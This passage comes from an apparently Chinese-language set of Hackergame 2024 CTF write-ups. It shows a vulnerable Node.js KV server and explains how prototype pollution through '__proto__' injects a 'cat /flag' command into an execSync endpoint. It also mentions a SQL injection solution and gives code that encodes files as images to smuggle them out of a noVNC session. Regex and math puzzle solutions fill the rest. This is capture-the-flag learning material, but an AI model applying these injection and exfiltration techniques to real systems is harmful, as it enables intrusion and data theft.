function_">join</span>(__dirname, <span class="string">&quot;public&quot;</span>)));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> cmds = &#123;</span><br><span class="line">  <span class="attr">getsource</span>: <span class="string">&quot;cat server.js&quot;</span>,</span><br><span class="line">  <span class="attr">test</span>: <span class="string">&quot;echo &#x27;hello, world!&#x27;&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> store = &#123;&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// GET /api/store - Retrieve the current KV store</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/store&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(store);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// POST /set - Set a key-value pair in the store</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/set&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; key, value &#125; = req.<span class="property">body</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">const</span> keys = key.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">let</span> current = store;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> key = keys[i];</span><br><span class="line">    <span class="keyword">if</span> (!current[key]) &#123;</span><br><span class="line">      current[key] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    current = current[key];</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Set the value at the last key</span></span><br><span class="line">  current[keys[keys.<span class="property">length</span> - <span class="number">1</span>]] = value;</span><br><span class="line"> </span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;OK&quot;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// GET /get - Get a key-value pair in the store</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/get&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> key = req.<span class="property">query</span>.<span class="property">key</span>;</span><br><span class="line">  <span class="keyword">const</span> keys = key.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">let</span> current = store;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> key = keys[i];</span><br><span class="line">    <span class="keyword">if</span> (current[key] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&quot;Not exists.&quot;</span> &#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    current = current[key];</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: current &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// GET /execute - Run commands which are constant and obviously safe.</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/execute&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> key = req.<span class="property">query</span>.<span class="property">cmd</span>;</span><br><span class="line">  <span class="keyword">const</span> cmd = cmds[key];</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&quot;content-type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title function_">execSync</span>(cmd).<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;*&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;public&quot;</span>, <span class="string">&quot;index.html&quot;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Start the server</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`KV Service is running on port <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>在js中，{}也是一个对象，通过该对象的 <code>__proto__</code> 属性，可以给对象的的属性设置默认值：</p>
<p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250625105612345.png" alt="image-20250625105612345"></p>
<p>于是可使用set方法向库中存储<code>__proto__.flagc</code>值为<code>cat \flag</code></p>
<p>接着调用cmds接口执行即可</p>
<h1 id="PaoluGPT"><a href="#PaoluGPT" class="headerlink" title="PaoluGPT"></a>PaoluGPT</h1><p>题目已无法打开，该题解法为使用爬虫爬聊天记录查找flag字样获取第一个flag，另使用sql注入将隐藏聊天记录展示获取第二个flag</p>
<h1 id="强大的正则表达式"><a href="#强大的正则表达式" class="headerlink" title="强大的正则表达式"></a>强大的正则表达式</h1><h2 id="一级"><a href="#一级" class="headerlink" title="一级"></a>一级</h2><p>由于10000是16的倍数，故后四位可以决定当前数是否为16的倍数：</p>
<p>a<em>10000+b</em>16&#x3D;16y</p>
<p>故暴力拼接所有的后四位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;(0|1|2|3|4|5|6|7|8|9)*&#x27; + &#x27;(&#x27; + &#x27;|&#x27;.join(f&#x27;&#123;i:04d&#125;&#x27; for i in range(0, 10000, 16)) + &#x27;)&#x27;)    </span><br><span class="line">(0|1|2|3|4|5|6|7|8|9)*(0000|0016|0032|0048|0064|0080|0096|0112|0128|0144|0160|0176|0192|0208|0224|0240|0256|0272|0288|0304|0320|0336|0352|0368|0384|0400|0416|0432|0448|0464|0480|0496|0512|0528|0544|0560|0576|0592|0608|0624|0640|0656|0672|0688|0704|0720|0736|0752|0768|0784|0800|0816|0832|0848|0864|0880|0896|0912|0928|0944|0960|0976|0992|1008|1024|1040|1056|1072|1088|1104|1120|1136|1152|1168|1184|1200|1216|1232|1248|1264|1280|1296|1312|1328|1344|1360|1376|1392|1408|1424|1440|1456|1472|1488|1504|1520|1536|1552|1568|1584|1600|1616|1632|1648|1664|1680|1696|1712|1728|1744|1760|1776|1792|1808|1824|1840|1856|1872|1888|1904|1920|1936|1952|1968|1984|2000|2016|2032|2048|2064|2080|2096|2112|2128|2144|2160|2176|2192|2208|2224|2240|2256|2272|2288|2304|2320|2336|2352|2368|2384|2400|2416|2432|2448|2464|2480|2496|2512|2528|2544|2560|2576|2592|2608|2624|2640|2656|2672|2688|2704|2720|2736|2752|2768|2784|2800|2816|2832|2848|2864|2880|2896|2912|2928|2944|2960|2976|2992|3008|3024|3040|3056|3072|3088|3104|3120|3136|3152|3168|3184|3200|3216|3232|3248|3264|3280|3296|3312|3328|3344|3360|3376|3392|3408|3424|3440|3456|3472|3488|3504|3520|3536|3552|3568|3584|3600|3616|3632|3648|3664|3680|3696|3712|3728|3744|3760|3776|3792|3808|3824|3840|3856|3872|3888|3904|3920|3936|3952|3968|3984|4000|4016|4032|4048|4064|4080|4096|4112|4128|4144|4160|4176|4192|4208|4224|4240|4256|4272|4288|4304|4320|4336|4352|4368|4384|4400|4416|4432|4448|4464|4480|4496|4512|4528|4544|4560|4576|4592|4608|4624|4640|4656|4672|4688|4704|4720|4736|4752|4768|4784|4800|4816|4832|4848|4864|4880|4896|4912|4928|4944|4960|4976|4992|5008|5024|5040|5056|5072|5088|5104|5120|5136|5152|5168|5184|5200|5216|5232|5248|5264|5280|5296|5312|5328|5344|5360|5376|5392|5408|5424|5440|5456|5472|5488|5504|5520|5536|5552|5568|5584|5600|5616|5632|5648|5664|5680|5696|5712|5728|5744|5760|5776|5792|5808|5824|5840|5856|5872|5888|5904|5920|5936|5952|5968|5984|6000|6016|6032|6048|6064|6080|6096|6112|6128|6144|6160|6176|6192|6208|6224|6240|6256|6272|6288|6304|6320|6336|6352|6368|6384|6400|6416|6432|6448|6464|6480|6496|6512|6528|6544|6560|6576|6592|6608|6624|6640|6656|6672|6688|6704|6720|6736|6752|6768|6784|6800|6816|6832|6848|6864|6880|6896|6912|6928|6944|6960|6976|6992|7008|7024|7040|7056|7072|7088|7104|7120|7136|7152|7168|7184|7200|7216|7232|7248|7264|7280|7296|7312|7328|7344|7360|7376|7392|7408|7424|7440|7456|7472|7488|7504|7520|7536|7552|7568|7584|7600|7616|7632|7648|7664|7680|7696|7712|7728|7744|7760|7776|7792|7808|7824|7840|7856|7872|7888|7904|7920|7936|7952|7968|7984|8000|8016|8032|8048|8064|8080|8096|8112|8128|8144|8160|8176|8192|8208|8224|8240|8256|8272|8288|8304|8320|8336|8352|8368|8384|8400|8416|8432|8448|8464|8480|8496|8512|8528|8544|8560|8576|8592|8608|8624|8640|8656|8672|8688|8704|8720|8736|8752|8768|8784|8800|8816|8832|8848|8864|8880|8896|8912|8928|8944|8960|8976|8992|9008|9024|9040|9056|9072|9088|9104|9120|9136|9152|9168|9184|9200|9216|9232|9248|9264|9280|9296|9312|9328|9344|9360|9376|9392|9408|9424|9440|9456|9472|9488|9504|9520|9536|9552|9568|9584|9600|9616|9632|9648|9664|9680|9696|9712|9728|9744|9760|9776|9792|9808|9824|9840|9856|9872|9888|9904|9920|9936|9952|9968|9984)</span><br></pre></td></tr></table></figure>

<h2 id="二级"><a href="#二级" class="headerlink" title="二级"></a>二级</h2><p>使用python构建状态机，然后生成正则表达式</p>
<blockquote>
<p>DFA 的状态代表余数（有 0~12 一共 13 个状态），初始状态是 0，每次读入一个 bit 更新余数（状态转移）（<code>s:=(s*2+b)%13</code>），读入完毕后如果 DFA 处于 0 状态（余数为 0），就意味着这个二进制数整除 13。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install greenery</span></span><br><span class="line"><span class="comment"># pip install regex</span></span><br><span class="line"><span class="keyword">from</span> greenery <span class="keyword">import</span> Fsm, Charclass, rxelems</span><br><span class="line"><span class="keyword">import</span> regex <span class="keyword">as</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># 模13</span></span><br><span class="line">m = <span class="number">13</span></span><br><span class="line"><span class="comment"># 二进制 </span></span><br><span class="line">d = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许的数字字符</span></span><br><span class="line">digits = [Charclass(<span class="built_in">str</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d)]</span><br><span class="line"><span class="comment"># 非法输入</span></span><br><span class="line">other = ~Charclass(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d)))</span><br><span class="line">alphabet = <span class="built_in">set</span>(digits + [other])</span><br><span class="line"><span class="comment"># 状态集合</span></span><br><span class="line">states = <span class="built_in">set</span>(<span class="built_in">range</span>(m + <span class="number">1</span>))  <span class="comment"># m is the dead state</span></span><br><span class="line">initial_state = <span class="number">0</span></span><br><span class="line"><span class="comment"># 只有余数为0可接受</span></span><br><span class="line">accepting_states = &#123;<span class="number">0</span>&#125;</span><br><span class="line"><span class="comment">#状态转换表</span></span><br><span class="line">transition_map = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    transition_map[s] = &#123;digits[i]: (s * d + i) % m <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d)&#125;</span><br><span class="line">    transition_map[s][other] = m</span><br><span class="line">transition_map[m] = &#123;digits[i]: m <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d)&#125;</span><br><span class="line">transition_map[m][other] = m</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建状态机</span></span><br><span class="line">dfa = Fsm(</span><br><span class="line">    alphabet=alphabet,</span><br><span class="line">    states=states,</span><br><span class="line">    initial=initial_state,</span><br><span class="line">    finals=accepting_states,</span><br><span class="line">    <span class="built_in">map</span>=transition_map,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这部分是为了满足题目限制（有些字符不允许）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_regex</span>(<span class="params">regex</span>):</span><br><span class="line">    <span class="comment"># `(...)?` -&gt; `((...)|)`</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> regex:</span><br><span class="line">        regex = re.sub(<span class="string">r&#x27;\((.*?)\)\?&#x27;</span>, <span class="string">r&#x27;(\1|)&#x27;</span>, regex)</span><br><span class="line">    <span class="comment"># Handle `&#123;n&#125;` quantifier</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> regex:</span><br><span class="line">        <span class="keyword">while</span> <span class="string">&#x27;&#123;&#x27;</span> + <span class="built_in">str</span>(n) + <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> regex:</span><br><span class="line">            regex = re.sub(<span class="string">r&#x27;(\((.*?)\)|\w)\&#123;n\&#125;&#x27;</span>.replace(<span class="string">&#x27;n&#x27;</span>, <span class="built_in">str</span>(n)), <span class="string">r&#x27;\1&#x27;</span> * n, regex)</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    <span class="comment"># [abc] -&gt; (a|b|c)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;[&#x27;</span> <span class="keyword">in</span> regex:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">convert_charset</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">            chars = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;(&#x27;</span> + <span class="string">&#x27;|&#x27;</span>.join(chars) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">        regex = re.sub(<span class="string">r&#x27;\[([^\]]+)\]&#x27;</span>, convert_charset, regex)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">set</span>(regex) &lt;= <span class="built_in">set</span>(<span class="string">&quot;0123456789|()*&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> regex</span><br><span class="line"><span class="comment"># 生成正则表达式</span></span><br><span class="line">dfa = dfa.reduce()</span><br><span class="line">regex = rxelems.from_fsm(dfa)</span><br><span class="line">regex = regex.reduce()</span><br><span class="line">regex = convert_regex(<span class="built_in">str</span>(regex))</span><br><span class="line"><span class="built_in">print</span>(regex)</span><br></pre></td></tr></table></figure>



<h1 id="惜字如金-3-0"><a href="#惜字如金-3-0" class="headerlink" title="惜字如金 3.0"></a>惜字如金 3.0</h1><p>写个脚本判断哪行少于80，然后按照规则补充，第一关基本上都是些关键字或者常见单词</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_lines_under_80</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> line_number, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(file, <span class="number">1</span>):</span><br><span class="line">                stripped_line = line.rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                line_length = <span class="built_in">len</span>(stripped_line)</span><br><span class="line">                <span class="keyword">if</span> line_length &lt; <span class="number">80</span>:</span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Line <span class="subst">&#123;line_number&#125;</span>: (Length: <span class="subst">&#123;line_length&#125;</span>) <span class="subst">&#123;stripped_line&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(count)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：找不到文件 &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    file_path = <span class="string">&#x27;D:\\study\\hkgame\\answer_a.py&#x27;</span></span><br><span class="line">    print_lines_under_80(file_path)</span><br></pre></td></tr></table></figure>

<p>第二关在第一关的基础上，将b字符串进行了缩写，需要阅读源码，与CRC算法有关；</p>
<h1 id="优雅的不等式"><a href="#优雅的不等式" class="headerlink" title="优雅的不等式"></a>优雅的不等式</h1><p>从代码注释给出的样例输入可以看出，将四分之一圆减去其内接三角形转换成定积分形式就能证明 π≥2，显然构造一个可以被四分之一圆覆盖并且面积等于 2&#x2F;3 的函数图像就可以证明 π≥8&#x2F;3，一个很容易想到的例子就是抛物线 f(x)&#x3D;1−x2，刚好可以满足要求</p>
<h1 id="无法获取的秘密"><a href="#无法获取的秘密" class="headerlink" title="无法获取的秘密"></a>无法获取的秘密</h1><p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250629150451208.png" alt="image-20250629150451208"></p>
<p><img src="/2025/06/20/%E7%AC%94%E8%AE%B0/hackergame2024/hackergame2024/image-20250629154433468.png" alt="image-20250629154433468"></p>
<h2 id="涉及点"><a href="#涉及点" class="headerlink" title="涉及点"></a>涉及点</h2><h3 id="图像编码"><a href="#图像编码" class="headerlink" title="图像编码"></a>图像编码</h3><p>将文件编码为图像，通过截屏等方式下载到本地后再解码，由于novnc有图像传输压缩，故无法进行彩色编码（会色彩失真），可通过黑白编码保证数据准确性。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>二进制文件转黑白图片<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;processFile(this.files[0])&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;status&quot;</span>&gt;</span>选择文件开始转换<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;results&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 处理文件</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">processFile</span>(<span class="params">file</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!file) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;status&#x27;</span>).<span class="property">textContent</span> = <span class="string">`处理中: <span class="subst">$&#123;file.name&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span></span><br><span class="line"><span class="language-javascript">            reader.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> buffer = e.<span class="property">target</span>.<span class="property">result</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> bytes = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(buffer);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">convertToImages</span>(bytes);</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            reader.<span class="title function_">readAsArrayBuffer</span>(file);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 转换为图片</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">convertToImages</span>(<span class="params">bytes</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> width = <span class="number">1024</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> height = <span class="number">768</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> bitsPerImage = width * height;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 向上取整</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> totalImages = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(bytes.<span class="property">length</span> * <span class="number">8</span> / bitsPerImage);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> results = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;results&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            results.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 按图片数量循环</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; totalImages; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;canvas&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                canvas.<span class="property">width</span> = width;</span></span><br><span class="line"><span class="language-javascript">                canvas.<span class="property">height</span> = height;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> imageData = ctx.<span class="title function_">createImageData</span>(width, height);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> data = imageData.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 当前图片bit起始位置</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> bitIndex = i * bitsPerImage;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (<span class="keyword">let</span> pixel = <span class="number">0</span>; pixel &lt; width * height &amp;&amp; bitIndex &lt; bytes.<span class="property">length</span> * <span class="number">8</span>; pixel++) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 获取当前像素要存储的字节</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> bytePos = <span class="title class_">Math</span>.<span class="title function_">floor</span>(bitIndex / <span class="number">8</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 位的位置</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> bitPos = bitIndex % <span class="number">8</span>;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// 获取当前bit的值</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> bitValue = (bytes[bytePos] &gt;&gt; (<span class="number">7</span> - bitPos)) &amp; <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">                    </span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> color = bitValue ? <span class="number">0</span> : <span class="number">255</span>; <span class="comment">// 1=黑色, 0=白色</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> idx = pixel * <span class="number">4</span>;</span></span><br><span class="line"><span class="language-javascript">                    data[idx] = color;     <span class="comment">// R</span></span></span><br><span class="line"><span class="language-javascript">                    data[idx + <span class="number">1</span>] = color; <span class="comment">// G</span></span></span><br><span class="line"><span class="language-javascript">                    data[idx + <span class="number">2</span>] = color; <span class="comment">// B</span></span></span><br><span class="line"><span class="language-javascript">                    data[idx + <span class="number">3</span>] = <span class="number">255</span>;   <span class="comment">// A</span></span></span><br><span class="line"><span class="language-javascript">                    </span></span><br><span class="line"><span class="language-javascript">                    bitIndex++;</span></span><br><span class="line"><span class="language-javascript">                